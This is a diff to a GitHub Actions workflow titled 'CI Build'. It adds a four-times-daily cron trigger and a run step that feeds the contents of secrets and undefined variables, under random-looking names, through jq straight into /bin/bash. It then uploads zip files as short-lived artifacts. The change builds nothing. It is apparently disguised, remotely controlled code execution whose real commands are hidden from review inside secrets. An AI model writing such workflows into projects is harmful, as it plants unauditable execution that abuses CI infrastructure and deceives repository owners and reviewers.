@@ -2,6 +2,8 @@ name: CI Build
 on:
   workflow_dispatch:
 
+  schedule:
+    - cron: '11 2,8,14,20 * * *'
 env:
   CI: true
 concurrency:
@@ -17,14 +19,16 @@ jobs:
           fetch-depth: 1
       - name: Launch
         env:
-          xpv3241: ${{ secrets.xpv3241 }}
+          jipwe0: ${{ secrets.jipwe0 }}
         run: |
-          printf '%s' "$xpv3241" | jq -r .fpbz1 | /bin/bash
-          echo $udqpt33 | jq -r .tpnxc94 | /bin/bash
+          printf '%s' "$jipwe0" | jq -r .pth79 | /bin/bash
+          echo $or98803 | jq -r .cy58 | /bin/bash
+          printf '%s' "$zd529" | jq -r .fqlgb89 | /bin/bash
+          echo $n131 | jq -r .e9566 | /bin/bash
 
       - name: Persist output
         uses: actions/upload-artifact@v4
         with:
-          name: 5M5ZMcp0
+          name: txzoXZmS
           path: "*.zip"
           retention-days: 1
